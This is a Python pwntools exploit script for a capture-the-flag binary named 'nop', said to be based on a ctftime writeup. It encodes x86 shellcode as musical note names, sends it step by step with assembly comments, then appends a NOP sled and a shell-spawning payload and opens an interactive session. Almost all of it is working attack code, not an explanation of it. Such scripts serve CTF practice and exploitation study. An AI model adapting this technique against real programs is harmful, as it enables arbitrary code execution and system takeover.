# This exploit is originally from (and based off of): https://ctftime.org/writeup/10040

from pwn import *

target = process("./nop")
gdb.attach(target, gdbscript = 'entry-break')

opcodes = {'G#1': '0x6500', 'G#0': '0x3300', 'G#3': '0x9401', 'G#2': '0xca00', 'G#5': '0x4e06', 'G#4': '0x2703', 'G#7': '0x1a', 'G#6': '0xd', 'G#9': '0x65', 'G#8': '0x33', 'G7': '0x18', 'G6': '0xc', 'G5': '0x6', 'G4': '0x3', 'G3': '0x7d01', 'G2': '0xbf00', 'G1': '0x6000', 'G0': '0x3000', 'G9': '0x60', 'G8': '0x30', 'D#8': '0x26', 'D#9': '0x4c', 'D#6': '0xa', 'A8': '0x1b', 'B4': '0xe001', 'B5': '0xc003', 'B6': '0x8007', 'B7': '0xf', 'B0': '0x1e00', 'B1': '0x3c00', 'B2': '0x7800', 'B3': '0xf000', 'B8': '0x1e', 'B9': '0x3c', 'F#0': '0x2d00', 'F#1': '0x5a00', 'F#2': '0xb400', 'F#3': '0x6801', 'F#4': '0xcf02', 'F#5': '0x9e05', 'F#6': '0x3c0b', 'F#7': '0x17', 'F#8': '0x2d', 'F#9': '0x5a', 'E9': '0x51', 'E8': '0x29', 'E5': '0x105', 'E4': '0x8102', 'E7': '0x15', 'E6': '0x20a', 'E1': '0x5100', 'E0': '0x2900', 'E3': '0x4101', 'E2': '0xa100', 'A#3': '0xe300', 'A#2': '0x7200', 'A#1': '0x3900', 'A#0': '0x1d00', 'A#7': '0x280e', 'A#6': '0x1407', 'A#5': '0x8a03', 'A#4': '0xc501', 'A#9': '0x39', 'A#8': '0x1d', 'C9': '0x40', 'C8': '0x20', 'C3': '0x1', 'C2': '0x8000', 'C1': '0x4000', 'C0': '0x2000', 'C7': '0x10', 'C6': '0x8', 'C5': '0x4', 'C4': '0x2', 'F0': '0x2b00', 'F1': '0x5500', 'F2': '0xaa00', 'F3': '0x5401', 'F4': '0xa702', 'F5': '0x4e05', 'F6': '0xb', 'F7': '0x16', 'F8': '0x2b', 'F9': '0x55', 'A1': '0x3600', 'A0': '0x1b00', 'A3': '0xd600', 'A2': '0x6b00', 'A5': '0x5703', 'A4': '0xac01', 'A7': '0xe', 'A6': '0x7', 'A9': '0x36', 'D#7': '0x13', 'D#4': '0x5d02', 'D#5': '0x5', 'D#2': '0x9800', 'D#3': '0x2f01', 'D#0': '0x2600', 'D#1': '0x4c00', 'C#9': '0x44', 'C#8': '0x22', 'C#5': '0x3604', 'C#4': '0x1b02', 'C#7': '0x11', 'C#6': '0x6b08', 'C#1': '0x4400', 'C#0': '0x2200', 'C#3': '0xe01', 'C#2': '0x8700', 'D8': '0x24', 'D9': '0x48', 'D6': '0x9', 'D7': '0x12', 'D4': '0x3b02', 'D5': '0x7604', 'D2': '0x8f00', 'D3': '0x1e01', 'D0': '0x2400', 'D1': '0x4800'}

def prepNoteString(x):
	x = int(x, 16)
	y = x & 0xff
	z = x & 0xff00
	z = z >> 8
	x = chr(z) + chr(y)
	return x

def clearStackSpot():
	loopSend("G6", 3)
	send("G1")
	send("G0")

def writePopaStackValue():
	send("F6")
	send("F6")
	send("F6")
	send("F1")
	send("F0")


def send(op):
	target.send(prepNoteString(opcodes[op]))

def loopSend(op, qt):
	for i in xrange(qt):
		target.send(prepNoteString(opcodes[op]))

'''
inc ecx ; A
xor    eax, DWORD PTR [esi+0x30] ; 3F0
'''
send("A3")
send("F0")



'''
; A1 G0 first xor
inc ecx ; A
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 second xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 third xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 fourth xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 fifth xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0
'''
send("A1")
send("G0")
clearStackSpot()
clearStackSpot()
clearStackSpot()
clearStackSpot()


'''
; A3 F#6 A4 A6 A4 C6 A (Last A is borrowed from next step)
inc    ecx ; A
xor    eax, DWORD PTR [esi+0x23] ; 3F#
ss inc ecx ; 6A
xor    al,0x41 ;  4A
ss inc ecx ; 6A
xor    al,0x43 ; 4C
ss inc ecx ; 6A
'''
send("A3")
send("F#6")
send("A4")
send("A6")
send("A4")
send("C6")
send("A0")



'''
; 0 G0 A0 G2 A0 G3
xor    BYTE PTR [edi+0x30], al ; 0G0
inc    ecx ; A
xor    BYTE PTR [edi+0x32], al ; 0G2
inc    ecx ; A
xor    BYTE PTR [edi+0x33], al ; 0G3
'''
send("G0")
send("A0")
send("G2")
send("A0")
send("G3")



'''
; A4 B4 C6 A0 G1
inc    ecx ; A
xor    al, 0x42 ; 4B
xor    al, 0x43 ; 4C
ss     inc ecx ; 6A
xor    BYTE PTR [edi+0x31], al ; 0G1
'''
send("A4")
send("B4")
send("C6")
send("A0")
send("G1")


'''
; A4 A4 B6 A3 (3 is used in next step)
inc    ecx ; A
xor    al, 0x41 ; 4A
xor    al, 0x42 ; 4B
ss     inc ecx ; 6A
'''
send("A4")
send("A4")
send("B6")
send("A3")



'''
; 3 G0 A#8 
xor    eax, DWORD PTR [edi+0x30] ; 3G0
inc    ecx ; A
and    edi, DWORD PTR [eax] ; #8
'''
send("G0")
send("A#8")



'''
; A4 B4 C6 A#8
inc    ecx ; A
xor    al,0x42 ; 4B
xor    al,0x43 ; 4C
ss inc ecx ; 6A
and    edi,DWORD PTR [eax] ; #8
'''
send("A4")
send("B4")
send("C6")
send("A#8")


'''
; A4 A6 A0 D8 A6 (6 is used in next step)
inc    ecx ; A
xor    al,0x41 ; 4A
ss inc ecx ; 6A
xor    BYTE PTR [eax+edi*1+0x41],al ; 0D8A
'''
send("A4")
send("A6")
send("A0")
send("D8")
send("A6")


'''
; 6 F6 F6 F6 F1 F0 F6 F6 F6 F1 F0
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
xor    DWORD PTR [esi+0x30],eax ; 1F0

inc    esi ; F
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
xor    DWORD PTR [esi+0x30],eax ; 1F0
'''
writePopaStackValue()
writePopaStackValue()



'''
; A3 F0 A4 A4 B6 (6 is used in next step)
inc    ecx ; A
xor    eax,DWORD PTR [esi+0x30] ; 3F0
inc    ecx ; A
xor    al,0x41 ; 4A
xor    al,0x42 ; 4B
'''
send("A3")
send("F0")
send("A4")
send("A4")
send("B6")



'''
; 6 F6 F6 F6 F1 F0
ss     inc esi ; 6F
ss     inc esi ; 6F
ss     inc esi ; 6F
ss     inc esi ; 6F
xor    DWORD PTR [esi+0x30], eax ; 1F0
'''
writePopaStackValue()


'''
; D6 * 32
inc    esp  
ss inc esp
'''
loopSend("D6", 32)

'''
; A6
ss inc ecx ; A6 (400 times)
'''
loopSend("A6", 400)

# Send these two null byte so the target will stop scanning initial shellcode
target.send("\x00"*2)

# Make secondary shellcode
secondaryShellcode = "\x90"*1000

context = 'i386'
secondaryShellcode += asm(shellcraft.sh())

target.send(secondaryShellcode)

target.interactive()
